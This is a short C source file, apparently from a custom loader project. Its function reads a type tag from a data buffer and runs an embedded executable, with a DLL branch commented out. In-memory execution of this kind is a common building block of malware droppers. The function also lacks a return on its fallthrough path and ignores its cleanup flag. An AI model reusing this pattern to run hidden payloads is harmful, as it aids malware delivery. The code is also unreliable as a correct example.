#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"
#include "../../includes/parser/parser.h"


BOOL LdrLoadAndRun(LdrInfo info, BOOL CleanUpAfter) {
	DWORD type;
	LdrMemcpy(&type, info.DataPointer, sizeof(DWORD));
	info.DataPointer += sizeof(DWORD);
	info.DataSize    -= sizeof(DWORD);
	switch (type) {
	case FILE_EXE:
		if(!LdrRunExe(info))
			return FALSE;
		return TRUE;
	// case FILE_DLL:
	// 	if(!LdrRunDLL(info))
	// 		return FALSE;
	// 	return TRUE;
	}
}

